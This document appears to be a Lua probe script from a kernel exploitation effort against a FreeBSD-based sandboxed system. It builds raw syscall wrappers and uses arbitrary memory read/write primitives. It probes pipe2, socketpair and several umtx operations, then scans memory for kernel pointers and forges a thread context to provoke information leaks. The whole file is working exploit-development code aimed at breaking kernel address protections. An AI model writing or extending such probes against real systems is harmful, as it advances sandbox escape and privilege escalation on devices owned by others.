-- CRASH_CLASS: MODERATE
-- PROBE 126a: MULTI-VECTOR BLITZ — rapid testing of untested primitives
--
-- Tests in sequence:
--   A: pipe2(542) via make_syscall — untested, blocked via resolve but not via make_syscall
--   B: socketpair(135) via make_syscall — untested
--   C: UMTX PI mutex kernel pointer scan — lock a PI mutex, scan surroundings
--   D: UMTX_OP_ROBUST_LISTS(26) registration
--   E: UMTX_OP_SHM(25) — shared memory futex
--   F: thr_create + shared GPU mutex — two "threads" racing on mutex

print("=== PROBE 126a: MULTI-VECTOR BLITZ ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc20 = make_syscall(20)
local pid = to_num(sc20())
print("[0] pid=" .. pid)

--------------------------------------------------------------------
-- SECTION A: pipe2(542) via make_syscall
--------------------------------------------------------------------
print("")
print("--- SECTION A: pipe2(542) ---")
local sc_pipe2 = make_syscall(542)
local fds = memory.alloc(16)
zero(fds, 16)
wd(fds, 0xDEADDEAD)
wd(fds + 4, 0xDEADDEAD)

-- pipe2(int fildes[2], int flags)
-- O_CLOEXEC = 0x00100000, O_NONBLOCK = 0x00000004
local ok_p2, rv_p2 = pcall(function()
    return sc_pipe2(uint64(fds), uint64(0))  -- flags=0
end)
local fd0 = rd(fds)
local fd1 = rd(fds + 4)
print("[A] pipe2(0): ok=" .. tostring(ok_p2) .. " rv=" .. hex(rv_p2)
    .. " fd[0]=" .. tostring(fd0) .. " fd[1]=" .. tostring(fd1))

if fd0 and fd0 ~= 0xDEADDEAD and fd0 > 0 then
    print("[A] *** PIPE2 WORKS! fds=" .. fd0 .. "," .. fd1 .. " ***")

    -- Quick write/read test
    local sc_write = make_syscall(4)
    local sc_read = make_syscall(3)
    local wbuf = memory.alloc(16)
    local rbuf = memory.alloc(16)
    wd(wbuf, 0xCAFEBABE)
    zero(rbuf, 16)

    local ok_w, rv_w = pcall(function()
        return sc_write(uint64(fd1), uint64(wbuf), uint64(4))
    end)
    print("[A] write: ok=" .. tostring(ok_w) .. " rv=" .. hex(rv_w))

    local ok_r, rv_r = pcall(function()
        return sc_read(uint64(fd0), uint64(rbuf), uint64(4))
    end)
    local rval = rd(rbuf)
    print("[A] read: ok=" .. tostring(ok_r) .. " rv=" .. hex(rv_r)
        .. " data=0x" .. string.format("%X", rval or 0))
    if rval == 0xCAFEBABE then
        print("[A] *** PIPE2 READ/WRITE CONFIRMED! ***")
    end
else
    -- Try with O_NONBLOCK
    zero(fds, 16)
    wd(fds, 0xDEADDEAD); wd(fds + 4, 0xDEADDEAD)
    local ok2, rv2 = pcall(function()
        return sc_pipe2(uint64(fds), uint64(4))  -- O_NONBLOCK
    end)
    local f0 = rd(fds); local f1 = rd(fds + 4)
    print("[A] pipe2(O_NONBLOCK): ok=" .. tostring(ok2) .. " rv=" .. hex(rv2)
        .. " fd[0]=" .. tostring(f0) .. " fd[1]=" .. tostring(f1))
end

print("[A] canary=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: socketpair(135) via make_syscall
--------------------------------------------------------------------
print("")
print("--- SECTION B: socketpair(135) ---")
local sc_sp = make_syscall(135)
local spfds = memory.alloc(16)
zero(spfds, 16)
wd(spfds, 0xDEADDEAD); wd(spfds + 4, 0xDEADDEAD)

-- socketpair(AF_UNIX=1, SOCK_STREAM=1, 0, sv[2])
local ok_sp, rv_sp = pcall(function()
    return sc_sp(uint64(1), uint64(1), uint64(0), uint64(spfds))
end)
local sp0 = rd(spfds); local sp1 = rd(spfds + 4)
print("[B] socketpair: ok=" .. tostring(ok_sp) .. " rv=" .. hex(rv_sp)
    .. " fd[0]=" .. tostring(sp0) .. " fd[1]=" .. tostring(sp1))

if sp0 and sp0 ~= 0xDEADDEAD and sp0 > 0 then
    print("[B] *** SOCKETPAIR WORKS! ***")
end
print("[B] canary=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION C: UMTX PI mutex with kernel pointer scan
--------------------------------------------------------------------
print("")
print("--- SECTION C: PI MUTEX KERNEL POINTER SCAN ---")
local sc_umtx = make_syscall(454)
local sc_mmap = make_syscall(477)

-- Allocate a GPU mmap page for the mutex (so we can scan around it)
local ok_mm, mpage = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(0x33),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("[C] mutex page: ok=" .. tostring(ok_mm) .. " base=" .. hex(mpage))
if not ok_mm then
    print("[C] SKIP: mmap failed")
else
    local maddr = to_num(mpage)

    -- Zero entire page
    zero(mpage, 0x4000)

    -- Place PI mutex at offset 0x100 (aligned)
    local mutex_off = 0x100
    local mutex = maddr + mutex_off
    -- UMTX_OP_MUTEX_LOCK_PI = 17 (FreeBSD)
    -- UMTX_OP_MUTEX_UNLOCK_PI = 18

    -- Write flags to mutex word: UMUTEX_UNOWNED=0 + PI flag
    -- Actually, PI mutex just needs owner word at offset 0
    -- umutex struct: m_owner (4 bytes), m_flags (4 bytes), ...
    wd(mutex, 0)         -- m_owner = 0 (unlocked)
    wd(mutex + 4, 4)     -- m_flags = UMUTEX_PRIO_INHERIT (4)

    print("[C] pre-lock scan (8 qwords around mutex):")
    for off = -32, 64, 8 do
        local v = rq(maddr + mutex_off + off)
        if v then
            local h, l = get_hi_lo(v)
            if h ~= 0 or l ~= 0 then
                print(string.format("  mutex%+d: %s", off, hex(v)))
            end
        end
    end

    -- Lock the PI mutex
    local ok_lk, rv_lk = pcall(function()
        return sc_umtx(uint64(mutex), uint64(17), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    print("[C] lock_PI: ok=" .. tostring(ok_lk) .. " rv=" .. hex(rv_lk))
    print("[C] owner after lock: 0x" .. string.format("%08X", rd(mutex) or 0))

    -- EXTENSIVE scan of the entire page for kernel pointers
    local kptr_count = 0
    print("[C] post-lock full page scan for kernel pointers:")
    for off = 0, 0x3FF8, 8 do
        local v = rq(maddr + off)
        if v then
            local h, l = get_hi_lo(v)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                kptr_count = kptr_count + 1
                print(string.format("  +0x%04X: %s *** KERNEL PTR ***", off, hex(v)))
            elseif (h ~= 0 or l ~= 0) and off >= mutex_off - 32 and off <= mutex_off + 96 then
                -- Non-zero near mutex
                print(string.format("  +0x%04X: %s", off, hex(v)))
            end
        end
    end
    print("[C] kernel pointers found: " .. kptr_count)

    -- Unlock
    local ok_ul, rv_ul = pcall(function()
        return sc_umtx(uint64(mutex), uint64(18), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    print("[C] unlock_PI: ok=" .. tostring(ok_ul) .. " rv=" .. hex(rv_ul))
end
print("[C] canary=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION D: UMTX_OP_ROBUST_LISTS (op 26)
--------------------------------------------------------------------
print("")
print("--- SECTION D: UMTX_OP_ROBUST_LISTS (26) ---")
-- robust_list_head struct:
--   +0x00: list pointer (head of robust list)
--   +0x08: futex_offset (offset to futex word within each entry)
--   +0x10: list_op_pending
-- Size = 0x18 (24 bytes) on amd64

local robust = memory.alloc(0x40)
zero(robust, 0x40)
-- Set list pointer to point to itself (empty list)
wq(robust + 0x00, uint64(robust))
-- futex_offset = 0 (futex word at start of each entry)
wq(robust + 0x08, uint64(0))
-- list_op_pending = NULL
wq(robust + 0x10, uint64(0))

-- UMTX_OP_ROBUST_LISTS = 26
-- Args: uaddr1 = pointer to robust_list_head, val = sizeof(robust_list_head)
local ok_rl, rv_rl = pcall(function()
    return sc_umtx(uint64(robust), uint64(26), uint64(0x18), uint64(0), uint64(0), uint64(0))
end)
print("[D] robust_lists: ok=" .. tostring(ok_rl) .. " rv=" .. hex(rv_rl))

-- Check if the kernel wrote anything to our robust list area
print("[D] post-register robust list dump:")
for off = 0, 0x38, 8 do
    local v = rq(robust + off)
    if v then
        local h, l = get_hi_lo(v)
        if h ~= 0 or l ~= 0 then
            print(string.format("  +0x%02X: %s", off, hex(v)))
        end
    end
end
print("[D] canary=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION E: UMTX_OP_SHM (op 25)
--------------------------------------------------------------------
print("")
print("--- SECTION E: UMTX_OP_SHM (25) ---")
-- UMTX_OP_SHM creates or looks up a shared memory futex object
-- uaddr1 = key, val = UMTX_SHM_CREAT(0) / UMTX_SHM_LOOKUP(1) / UMTX_SHM_DESTROY(2)

local shm_key = memory.alloc(16)
zero(shm_key, 16)
wd(shm_key, 0x12345678)

-- UMTX_SHM_CREAT = 0
local ok_shm, rv_shm = pcall(function()
    return sc_umtx(uint64(shm_key), uint64(25), uint64(0), uint64(0), uint64(0), uint64(0))
end)
print("[E] shm_creat: ok=" .. tostring(ok_shm) .. " rv=" .. hex(rv_shm))

-- UMTX_SHM_LOOKUP = 1
local ok_shl, rv_shl = pcall(function()
    return sc_umtx(uint64(shm_key), uint64(25), uint64(1), uint64(0), uint64(0), uint64(0))
end)
print("[E] shm_lookup: ok=" .. tostring(ok_shl) .. " rv=" .. hex(rv_shl))

-- Check what's at the key address now
print("[E] key area dump:")
for off = 0, 0x18, 4 do
    local v = rd(shm_key + off)
    if v and v ~= 0 then
        print(string.format("  +0x%02X: 0x%08X", off, v))
    end
end

print("[E] canary=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION F: thr_create + PI mutex contention
--------------------------------------------------------------------
print("")
print("--- SECTION F: THREAD + PI MUTEX CONTENTION ---")
-- Create a PI mutex locked by the main thread
-- Then create a child thread whose context has RDI=mutex_addr
-- and RIP=a gadget that... well, we can't easily make the child call umtx_op
-- BUT: the child's TID is allocated. If we write the child's TID
-- to a mutex and then call umtx_op from the main thread, the kernel
-- will look up the child thread by TID → potential kernel pointer in
-- the operation's internals

-- Create thread, get its TID
local sc_thr_create = make_syscall(430)
local sc_thr_self = make_syscall(432)

-- Get main TID
local tid_buf = memory.alloc(8)
zero(tid_buf, 8)
pcall(function() sc_thr_self(uint64(tid_buf)) end)
local main_tid = to_num(rq(tid_buf))
print("[F] main_tid=" .. main_tid)

-- Create child thread (will fault immediately)
local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx + 0x98, uint64(0x43))    -- CS
wq(ctx + 0xB0, uint64(0x3B))    -- SS
wq(ctx + 0xA0, uint64(0x202))   -- RFLAGS
wq(ctx + 0x118, uint64(0x480))  -- mc_len
wq(ctx + 0x90, uint64(0))       -- RIP=0 (fault)

local ok_stk, stack = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
wq(ctx + 0xA8, stack + 0x3F00)

local new_tid_buf = memory.alloc(8)
zero(new_tid_buf, 8)
local ok_tc, rv_tc = pcall(function()
    return sc_thr_create(uint64(ctx), uint64(new_tid_buf), uint64(0))
end)
local child_tid = to_num(rq(new_tid_buf))
print("[F] child_tid=" .. child_tid)

-- Wait for child to fault
local ts = memory.alloc(16)
wq(ts, uint64(0)); wq(ts + 8, uint64(100000000))
pcall(function() make_syscall(240)(uint64(ts), uint64(0)) end)

-- Set up a PI mutex in GPU mmap
-- Write child's TID as the owner (pretend the dead child holds the lock)
if ok_mm then
    local mutex2 = to_num(mpage) + 0x200
    wd(mutex2, child_tid)   -- owner = child TID
    wd(mutex2 + 4, 4)       -- UMUTEX_PRIO_INHERIT

    print("[F] mutex2 owner set to child_tid=" .. child_tid)

    -- Now main thread tries to lock — kernel must look up the owner thread
    -- If the child is dead, this might trigger error handling that leaks info
    print("[F] main thread attempting lock on dead-child-owned mutex...")
    local ok_lk2, rv_lk2 = pcall(function()
        return sc_umtx(uint64(mutex2), uint64(17), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    print("[F] lock_PI: ok=" .. tostring(ok_lk2) .. " rv=" .. hex(rv_lk2))
    print("[F] mutex2 owner after: 0x" .. string.format("%08X", rd(mutex2) or 0))

    -- Scan around mutex2 for kernel pointers
    for off = -32, 96, 8 do
        local v = rq(to_num(mpage) + 0x200 + off)
        if v then
            local h, l = get_hi_lo(v)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print(string.format("  [F] mutex2%+d: %s *** KERNEL PTR ***", off, hex(v)))
            elseif h ~= 0 or l ~= 0 then
                print(string.format("  [F] mutex2%+d: %s", off, hex(v)))
            end
        end
    end
end

print("[F] canary=" .. to_num(sc20()))
print("")
print("=== PROBE 126a COMPLETE ===")
